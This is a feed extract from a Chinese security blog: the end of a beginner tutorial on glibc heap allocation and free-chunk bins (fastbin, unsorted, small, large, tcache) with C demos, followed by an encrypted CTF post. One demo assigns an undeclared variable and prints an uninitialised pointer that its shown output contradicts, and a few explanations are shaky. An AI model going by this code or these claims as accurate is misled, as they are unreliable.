class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><blockquote><p>可以看出在打印free后的chunk情况时发生了段错误，因为puts中的参数为0x10c，是内核地址，所以不能访问。</p></blockquote><p><font size="5"><strong>敲黑板！敲黑板！敲黑板！</strong></font>这里再提出一个问题：<code>free后的chunk去哪了？我们再次申请同样大小的chunk，会返回什么指针？</code>这里先解决第二个问题：<code>在free chunk后，再次申请同样大小的chunk，这时返回用户的指针是什么呢？</code>下面还是用程序进行验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr0,*ptr1;</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr0,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"   </span></span><br><span class="line"><span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk0:%p\n"</span>,ptr0);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] ptr0 = NULL\n"</span>);</span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] The address of chunk1:%p\n"</span>,ptr1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] The address of chunk0:0x5652b84e52a0</span><br><span class="line">[+] ptr0 = NULL</span><br><span class="line">[*] The address of chunk1:0x5652b84e52a0</span><br></pre></td></tr></table></figure><blockquote><p>从上面的结果可以看出我<strong>们第一次和第二次返回的指针相同，也就说明我们两次申请的动态内存空间是同一个空间</strong>，这是什么原因呢？下面就一步一步来解决这个问题：在堆释放后，为了充分利用chunk，系统并不会立即收回chunk，而是把chunk放到一个地方，如果程序中再次申请同样大小的chunk时，会直接将该chunk的地址返回，这里说的地方就是存放空闲chunk的链表结构<code>bins</code>，这里涉及的结构体就是malloc_state，如下是它的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从上面的源代码可以看出，bins由两个数组构成分别是：FastbinsY[NFASTBINS]和bins[NBINS * 2 - 2]，通过查阅相关代码，可以知道FastbinsY[]中有一个容器：<code>fastbin</code>，bins[]由三个容器：<code>unsorted bins</code>、<code>small bins</code>和<code>large bins</code>。系统会根据空闲chunk的大小和处于的状态，会将空闲的chunk放在上述4个不同的bins中。注：在libc.2.26以上的动态链接库中又增加了一个<code>Tcache</code>机制，在这里就不展开了。</p></blockquote><h4 id="font-color-blue1fastbinsyfont"><a class="markdownIt-Anchor" href="#font-color-blue1fastbinsyfont"></a> <font color="blue"><code>1.FastbinsY[]</code></font></h4><p><code>fastbins</code></p><p>      该数组主要包含的是<code>fastbins</code>数据结构，它主要用于提高<strong>小内存</strong>的分配效率，默认情况下对于size_sz为4B的平台，小于64B的chunk分配请求；但对于size_ze为8B的平台，小于128B的chunk分配请求，首先会查找fastbins中是否具有所需大小的chunk存在，如果存在则直接返回；</p><p>      我们也可以<strong>把fastbins看作为small bins的一个cache</strong>，默认情况下，对于相同大小的链表上，fastbins只缓存small bins的前7个大小的chunk（Tcache也只缓存fastbins或smallbins的前7个大小的chunk），该结构的特点还有：</p><ol><li>没有bk指针，也就是说它是一个单链表结构</li><li>prev_inuse标志位一定为1，也就是说fastbins chunk不会和其他chunk进行合并</li><li>采用LIFO （先进后出）策略</li></ol><p>      fastbins的结构如下图：</p><p><img src="/images/136-13.png" alt></p><center><font size="2">图13</font></center><h4 id="font-color-blue2binsfont"><a class="markdownIt-Anchor" href="#font-color-blue2binsfont"></a> <font color="blue"><code>2.Bins[]</code></font></h4><p>      该数组中存放的是<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code>，这三个bin均是双链表结构，均可以发生合并，并且一共有126个bins，分别被划分为：</p><ul><li><code>bin[1]</code>：Unsorted bin</li><li><code>bin[2-63]</code>：small bins</li><li><code>bin[64-126]</code>：large bins</li></ul><p>      下图是三个bins的结构图：</p><p><img src="/images/136-15.png" alt></p><center><font size="2">图14</font></center><p><code>Unsorted bins</code></p><p>      Unsorted bins可以看成small bins和large bins的cache，其中只有一个Unsorted bin，并且是以双链表管理空闲的chunk，并且在unsorted bin中的chunk不进行排序，所有的chunk在回收时都要先放到unsorted chunk中（对于高版本的libc，会先放到Tcache中）。那么在分配时，也就是再次申请动态内存时，<strong>如果unsorted bin中没有合适的chunk，就会把unsorted bin中的所有chunk分别加入到所属的bin中</strong>，然后再在bin中分配合适的chunk，bins数组中的元素<code>bin[1]</code>用于存储unsorted bin的chunk链表头。</p><p><code>Small bins</code></p><p>      <code>ptmalloc</code>使用small bins管理空闲小的chunk，每个small bin中的chunk的大小与bin的index有关，计算公式如下：<code>chunk_size = 2*size_sz*index</code>，small bins和faste bins的大小有一部分是重叠的，其实当发生Consolidate时，fastbin中的堆块在一定情况下可以进入到small bin中。</p><p><code>Large bins</code></p><p>      在size_sz为4B的平台上，大小等于512B的空闲chunk或者在size_sz为8B的平台上，大小等于1024B的空闲chunks有large bins管理。Large bins一共包含63个bin，每个bin中的chunk大小不是一个固定公差的等差数列，，每组bin的数量依次为32，16，8，4，2，1，公差依次为64B、512B、4096B、32768B、262144B。</p><p><code>三个bin的大小对比</code></p><p>      如下图：</p><p><img src="/images/136-14.png" alt></p><center><font size="2">图15</font></center><p>      在讲完free相关的知识点后，我们应该清楚了，在free我们申请的动态内存后，系统并不会及时的收回，而是将空闲的chunk放入对应的链表结构中，等下次再申请相同大小的内存空间时，就无需再进行系统分配，而是直接将空闲的chunk返回，这样就极大的提高了堆的工作效率，下面我们通过一个示例代码来说明这一点，不过要说明的是，因为我的链接库是用的lib-2.30，如下图：</p><p><img src="/images/136-16.png" alt></p><center><font size="2">图16</font></center><p>所以在分配chunk时采用了tcache机制，关于这个机制我就不在展开，只需要知道<code>当一个Tcache链表装满了7个，再有对应的chunk被free，就会被放到相应的链表结构中</code>，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *c,*a,*b,*d,*e,*f,*g,*h,*i,*j;</span><br><span class="line">    <span class="keyword">char</span> *o;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 1</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 2</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 3 </span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 4</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 5</span></span><br><span class="line">f = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 6</span></span><br><span class="line">g = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 7</span></span><br><span class="line">h = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 8</span></span><br><span class="line">i = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 9</span></span><br><span class="line">j = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 10</span></span><br><span class="line">o = <span class="built_in">malloc</span>(<span class="number">300</span>);<span class="comment">// 11</span></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(e);</span><br><span class="line"><span class="built_in">free</span>(f);</span><br><span class="line"><span class="built_in">free</span>(g);</span><br><span class="line"><span class="built_in">free</span>(h);</span><br><span class="line"><span class="built_in">free</span>(i);</span><br><span class="line"><span class="built_in">free</span>(j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在示例代码中，我们一共申请了11个300B大小的chunk，释放了10个chunk，按理说释放的前7个chunk被放到了Tcache中，因为是300B，所以后面三个会被放到Unsorted bin中，下面来验证我们的猜测，结果如下图：</p></blockquote><p><img src="/images/136-17.png" alt></p><center><font size="2">图17</font></center><blockquote><p>有的同学可能会对上图产生疑问：<code>Unsorted bin明明只有1个chunk块，不是应该有3个吗？</code>是的，的确是一个chunk块，但是大家看一下该块的size是0x3c0，那么就是<code>0x140+0x140+0x140</code>的结果，可以看出，本来三个chunk被合并了1个chunk，这里面涉及了<code>Unlink</code>机制，限于本篇篇幅，这个知识点就不在这展开了，有兴趣的同学可以自行学习，我在后期也可能单独拿出来介绍，因为这个知识点在漏洞利用时还挺重要。</p><p>还记得前面学习到的prev_inuse位吗？在上面的Unsorted bin中我们就可以感受到该标志位，如下图：</p></blockquote><p><img src="/images/136-18.png" alt></p><center><font size="2">图18</font></center><blockquote><p>如果标志位是1的话，那么size的大小应该为0x141，所以在这里标志位置为0了。<font color="red"><strong>注意：一定要明白只有在双链表结构中，并且发生Unlink时，标志位才会发生改变</strong>。</font></p></blockquote><h3 id="font-color-navy0x05-总结font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-总结font"></a> <font color="navy"><code>0x05 总结</code></font></h3><p>      有关堆的入门很难，因为我的知识有限，所以只能先帮助大家了解到这里了，而且也不能保证本文没有错误，所以还希望有兴趣的同学可以自己再去看看其他的资料，自己多动手操作一下，以帮助自己的理解，谢谢！</p><h3 id="font-color-navy0x05-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x05-referencefont"></a> <font color="navy"><code>0x05 Reference</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/24753861?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=843456231229227008" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></p><p>[2] <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_state" target="_blank" rel="noopener">Browse the source code of glibc/malloc/malloc.c</a></p><p>[3] <a href="http://abcdxyzk.github.io/blog/2015/08/05/kernel-mm-malloc/" target="_blank" rel="noopener">进程分配内存的两种方式–brk() 和mmap()（不设计共享内存）</a></p><p>[4] <a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">Syscalls used by malloc.</a></p><p>[5] <a href="https://stackoverflow.com/questions/30542428/does-malloc-use-brk-or-mmap" target="_blank" rel="noopener">Does malloc() use brk() or mmap()?</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>CTF-misc类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/12/2020.07.12%EF%BC%88135%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/12/2020.07.12（135）/</id>
    <published>2020-07-11T16:00:00.000Z</published>
    <updated>2020-07-25T03:10:50.828Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d4808b5bdac6aecdfac0c4ee04e40320e3d7d62044026298eab971ba5854aa80">c0b876c68ce8db4db0f2c5b16525afa2120afc55a2908d3322993c0be48c66eea98792901880c8466344c44217b8155245b9c97fbf56caeec538fba2091d2fb1d44e09e20b8cdbdee5be6350e1ed3a9ec590acbeffabf613ab20db6d5c1cb38b57ffc0ff870bd64a59d98382f942ba3212e7f7a5386a19166af01f12a34921daa0f3f6da3f96aea2bfac19fffc6650f573c5e9e7d7c215111b530660463f3bfabec4e27c4232e739ec05a738e8cee95d24780134dd31c6a366ca0cc82e18c9e5c87d52965fbe10fd5579b033df16f0acd7f02f5711f2a73bf56ff93fab2224a5404fc63eb0fd6fa525127b5486f3c221c47752020457ad08b22c4424191553667b97f515f47201f5b325e5ae36af9d830cc996d352c2e9807b009af628ada336576337d32a5a0a07a490c1820e59ffa3aa8a9ca27319188efd967ca8a67582b64ea9628a35280c65088f521629e399a3f62680b2beb3550df265af60538193222ed2deb595fdf842a46ccd6ece97b8869c29342ad243cd805350ff135e2d6d7ccd9e34cdddc1ca5c34139f048db62ae75ca268ad9efba9526a838ae863acaccb124e3f219283575958588b48507f9da915657e310226013170f9ed0003b8674fa9f326c36693ea57b1dfa57268d6858c80a56cd07d6ae8f6cb65fbe11b8730bbdb44ef12e6eb32e06a31aa543452b3d00e27b76541e210bcbe9486bcd0c01753a76782a0a4552878bf6279bdfcd254d2533e89bc2352f8b6027e6501a973e65781964c58be7e776c39e01aad805faef40226577b75df9285dadb98f88bcb5ab5ea71b9c54693e8f212c57a2f71f3eb1774577ccf9d2e65c3e1cbd64243a39a417506cca5e08632a1d375fbc8bca80c24e48ed272ac0c6adc9ac1e34be234519540865895d2067dcc2562e7b881fdd1923e4b1b2e6cd3e972a226423fa34534f9a19151d25cf4fd2f2e58020585d13f826614055f39d67ad4f907056c68cc6c2cba4c7a90f24965a5b940b130aa0bc793c8de0509a4a2beed27253f7e2f835c565879b422932bd4a871936626178daf9569242d79180cd45d3572c805867dd10ccf5fa66a23efb3dd609032f4389394f7935d5ad337461899e98e672a241aa457718c8645530a3db92706150c6e000f51df64c070e836ac4a27a19672a798c2451a0d2bcdcb64c70450875d96e4f8847edd69aea2d605385f624379011c8669693cf85ec44c6ae53ac4535f430a85e061304cd5d449af361dccbc9044d6781664e87aab78067113a88bfad750c63918ec460b06835a1fa60738b1818ad1e9e790a94c45fd89f8e2f13231fddc150eb61ea5ca58090142ddf86bc05b7185748b0bf939131fff34b6d70ba5fcb7dbb8d25b12a3b6a6ca5d22c86cd63ade4fb765591ba43fe42b250c4371e74e57389adba4297d1dbb855606e6be2124fbe0d53e7f424db5ca37c8c61d413f5ff9b5daf6fef0af6906256ebc3c648539b9b94cc11d0bc4cda758955cda10053fc923d1fd86259e6c3bb5367924ebfe8983e7191ff67379b418662a858070807f963fe6c6e4a2fa8cc5fa6088900eaaeb3f63ab031ae184154e1781a8601c59cb864fbdfeb5833b43b621268842133108e21aaacfa88462387187b9794f67443ccef38d30a41f794867b1b289a8096947b36c5281e6f861eabb0ce10578b69710fd28c19472d9ef1a7c59086c0658b566a9ba89c1e4778196e52d21af6d58f53bec1e858024932454556b2a2bc2e44a19e50af587cc7e71ffff766fd64cd6f1cc59d46c978d0ada0609a0ee1fb8952094d64567cb887336b3d696a3bd5703554db3befe697a61f38f92534fa2fb87a02ea3aa1441dbd495981c2dd8266a7d961ca92c10c25c3d8ae1288047e0c29914e55320cfd48e7369572e0116f31c84e9862a50e46dc390a35e25920de3f1d00e327da087ae547b0a1ac8c47ee5580ebba876e01036f07cc32a35b4010306096f876da41a8c7d9be239221587153d6b813b91b7ae0b83424e0469e7832110f6b3ab09a2268595e0f23303d52f1a5e92804b19bac1d8a80c81f12f4143b57e8a20436fc9534f46184268633fb12de2c98861e5b441aa78bc0b661c0242eba907257403488bc57d0a95cb485d011969bf051bcc896595d2bc661deb4eb0d3d1bda071db274fefecc276d96058981c152fafd6f457a4f0214c8ddefd12addbc8963c7500c3e824ca3a853bbe3979b53a5a5b5fa7583efb24268bf9627999cdec41c0ff55c500c134e44529b1f8d7a13c799f6be08d9ea26f5a09f076bc9b78cbb0e66997c7386d68a2b4110329833f3e47d247b5482facffc65526a680f46c9f0f0100fb632616d1ab41cbf6cc597587b619e591e25594661b2df57644a3183bda14f9df55175d3717f10ba4b8580fede394ece155f59b6e7caa057a8588e7d34ee3d901f5a42d27bd4990a4eefc0e4ef63a2976d8182d1fa0acd04901e223a772ffb24d4a50542d1eb5a0cead0f0aea48c7da58865de278a353c9dbc217cf6a268c2f032a17ea23b4e5c397c58d416c188e73b81c69e17234890ae4d13cc9f2576840a7825f6182cf31549e5a7873493df5bced8e32b2c38780bac7546b08fe925fbf647dc10afc5660e182d488663aa02f868a9fb4247e8a701c63f9f0125b68395736e969ac6bea844b8bcff43ce8f989d9ee50885c1cb1a01eb25ae70952f8e065528480897d1034cec516bc725d235bec8cdaf51fed1577747977434e4e78869bc64ddbbcb864a7009254754b7aac4dfaf2236a7554b4f9631eae7b9b1207f3af63372f9a735b2a1539b59980ee370902bf51b9877e41f886b2f5fbd59ebb40f894e51daea58ba5b829953f620a51536afdf3030437c804a51321909d2284eeb32391a782563aa12854a5f3485d3389f2bc712bd046db50959b404ae68a538bdf377c32a61f0f41b9d94ba67cdc6ab690e76719fe82b56f31ec4bfdd57785b72382c284460077159affab8259d98c56084a5277a914347ad501040fc24d9c87ddac472fae2ecb0ad80bbe3325410748c2b582917dacec39533c3e09e7e6f0ad35cc084d1029becfff8d6d9a676fc6f97a8a0b38daf1ded848a3c649c3ec62f0e78f2d1a225dd40eb0230f733eda044ad42a4fa83499ed8eb24ece4f88cd2a089988c8433e559508bde79759f4a1b4d9c17faea4590b4f95db545996f08cd631bf6e6b2b6984b1278947f40bac178b035363589c69e5ecb9f71bb03016052e73eef2db1f83c669b64851f69aeb2d46f8eea757d18f4c824c180f9f76d61d94b9630b8bcb7ca81184a9e37996af28d107aad06db4fe3b7af22c815ebd5315e0b9e3816dcefa40b2b6c0d996f1160879a33b19f780e20f50da19c8d70c03d12fe975950ff6b19378c0156801f995b200ac281367178941d935e25813f39595f7c26ac3e30de4cd41526ca8e574314d01872eae12e7b08f0f4a26e9db12c8ea2952f7e5e5e6fd16ab29766a70c8bf8b095ef32c24a2679037ed499535546a8a3be55b79eb84eabb95773f3f85514c2d7f786b0b9c7f530fa40d2767b256d1182ad906625315a666af493a24b1ce665654c97d7e7eff1271c657e9c2a73156921e9daa3777d7c63da4f9be2e12646dbca48c42dad41b0af4211da774e63073088a20e9dca40ec2ce0ebec932521f79cd125d48c5917febbe583db430494b792ff57b906f0fe412cd333738122ee0749ef42b731df7660d3015646506d6144b238fb3d519ae4e62f60c143e83155a8daaf202ee5c46a0e20bf46ee1e169958f33ae0805fe8e9efb1c5f86040c6978104dd85c2f1c36927d1bd4fb82472190c7d7f35bda89e6f46181724c651ff7f3c2624c51646ace66fc90e48d7c9255888158e7f01496fe732396c402f6886cb44697d083cea93c7ad171eb8aa192e9ec6d6db5b9057736ce9d26e49a350be78157a46c7ba62c166445397cb064f139e4f207281d7aaeb32b155382032e78c5f4a8554619e3f8652e30aded3beaced7c4c0c38a1bd74c688338f143b9d34e88af52735341ca58c8b264db061dbffbfd849e6a607db83ca94a85e753f3c5e1baf698c2940527b7008f33001567a0d411e079b61655d76de17e71bd78e40dff671cfb36465cff5329839b4495a3be3013d52f02de3d15a7a337d3dbb9fb7169f374d3c07554ff0699b9c599051583aeaf47ba9030f8b7116d7e299930e31663b09344d04c103f7c3c6389ede4def35ed42602e5ced47161e38bc40691bfb694bd82b12187445350bf8b47a78fe233d67289d6a86aa935eea114946a5facf5f489ac3478a1f4fb74a6cbde9b027d952274fdb3f892762a60ef80a4e8a6d7549721444b7cd401e365d8ad22c3cc740799f6822cf3fbd0f9e1cceb12557cceba1ee5c4f042768abcf7a0520d383618ff0b9ee8698638bbd47eed91fab6175cd4d6359df7fb7e4e80fe6815cd385007d726ec73ebbf3520543c9274f0d8833c92a638dc51e83b7765deb577c7a41f589a56e8f899e5c1aa4c12e6d4695902ff790cc27eab7f9f67c9019c8a3fdde309fabb580c532b27047b1c2a154f1b9dd60aa4e758782776a26d5379d1051f93650fd56d0b71e34a692d2c2da91bcf5c349c002297d9025895fdb9288236f36b18a9f27e2e66209037cf5753029d0d451edb5b7aa7ce487fb6387b16e2875f3c08fbe9051b6eb432afd4da58f872441b717dcb1a0485429d7d58613adebe05f4f4c6782d8492e4d10e721f5dbe37b4bbc5d8aa3ff665ff704e0d845be138fbe86c7806788b3e2f67996c35b9a862ca9623a0fd9b554e8714192163c7d4f7e5e3db518345919d7cc925aeaae19226e762c6eb59dd3c5dc1a802990843f085d215b5c5d523fcfd68d7895b40167dc2aaefa7eec4f068fb60d76992733f3d95d594ce3e034308e89d2b7776bdf3adea52a33c1ec1f85a87a0c00dbed26ee548216cbfa8ef34e1cf49f745e4d4780c7773aad8e2ffcff4baa80a639c4bc1035d663417c10388c0d77abe8bba9ff738e7c4cb216d31c924e2438ef42841efe4f6771e4a8b19a847e6944d900752344b821500fdc3592621263e63cd8ac866c15df16c4768a3b51a44c53eb6f5b6a2191dd70b9d1974cc886282e68c385442111d7ff9b970f5b60bb9a84b18c5f931194286d62b7e22aee6acbc34435d1f796191a9da609dc40535efe89503bbe16b0dafbc47ea706ebbe17bf748142b68c29b128b9d9cda6dcb89d748a5577ad24230f2e2d961ea354d8660d2233cf9092845674c9acd7e63e10afd1796fdf098f9b08ff1b920698dab2856efd603637b485a5053c6a5e314827a4757c33f6eb8a106bdd61e0dc77f684a9267f14138e5e8d841c6a8ec3b9bd5663ca53bb10cb8f8bd03815b1ec07d41ff3d478be5f8ae9cb73f60087be5c40cf3a00000ea2353212b2e120e9e8cd620518d323958f13d97029a82daaafdd97e581e7096f9076d06d7b7a3e7cf37c27f292894e25b1a131a6ad4ef780cc6672b3071176d0feb7a89ee47929dfddf4cc3908545d776d41eecd96fc8d2b05714b6c4063e75ad4b0da0d2a45585e3adad7f8842a0ac0b2c3e2fcea6c0b6df7d6eb64424e703e3132bf60e7c7531a0e8ea5055107abe9571ba81b5b6d67df2b515d2fa8cdc5ff17cfe3cc1f4bb711adc5de7073d3963211ee8a95bdb4718183fd672f6bbd24e51ad8bc32c469c2bd82f6c54e2dbd3a600525292c4349b146fef766272700d4869fe7f5a45f853ae1037c84e2afc7d6f47c6cc710fb13546537e80835ac296a419b1310e84a607974cc692b628a2b8cb7e859eb3eee610ab4ca6ea8a4bc6a019457dc4a347220547160384f33db52b512cd8645506fb5b5fdac2927541604202b8d08f2a0c567432ae718206161dff5a9919f2e66a837122e6bedd712de43e7d9620ea68e7e224d7240c6ac50d4d7602bfea7f7d460f5b48b21d9a2c536fbfe27af900ebeb80b4e1717fe08b083ee4c1f9244514e0f54391fa4448af14bd81be95afaf16f4f0cc749c5c5e9b830a549937ae610b86eed9582281391d32ca1677cf038bbab0b37489835be58639b9e684cd629a4c88426392515cf1010c34434b48ce48895bfc8b6da897916aedbe14bec14aa4b70a73c41c33706050e4fa5bd1d6c07847603f060bb3a4ac4a2dce2a2866343d8e9681432d28e59048255cdac0d1a12b881e04ff7ef59f1b3bd2cf84673921f1468fd481a7b06fd6fd053b1e60c6aae15d2132bbd33c76d0ffcda5518a784bd283927d9c3a328916b5c4eb9cbaa16cfa3f671237b80ada9943f5dc8b19b571a56bbcd517b3ee7466938607d5f8e4dad802c2cd40594d95a1f5ab793b7d2104b46e50c6595e31fe5f738be75e13447ee0e36bcc7dbf604d454d02e13165dd376dbde4fbe039d6a158fd2971336833591ef6fe21acca48283d227605d23e59ff3b7018e60529de68d8e03d9961acd8ad480b3cf7c2a8240961e9b5cbc5d9c22e2ce0ed5ad2539b79972a306a7771ebb0c50e73324676f77b1fd58da48334f77498e1d0b6f4233bfe95ce8a5d4015e97f957a9d12698bc5ed9970d44eae2d029733561e0299b8103a1f377d8c2043ae469f30b0b542bcee169cddf793eb2183e391fd7fef05d4cb54f2f73e5c73944fcb4ee35281473ddd1654c41dfc9e8eb5bad04655c35b1cc2bba3bef092c9cacd0fd61e704bef63238d2bb6a3c54c816be6651e00148989b4f5dae84619b9d536d8237cfda19e9d65653f16e116bd836ba8ab9809cd3e1f3673122fd196ed114e98ac8873c4c1659949ca136835476c4da7e4abbde04b848ebc8a1f7ddd75f19641ed99e5047fdd76ab0f8990f150f60d59257c6d90474f3a58e814356c06a4079340f05b1544a563ed05a6ba6484f31cb3a399a63168219b5d938fe65fdb1fa4b8ecabac707cd59001875f99d568ff70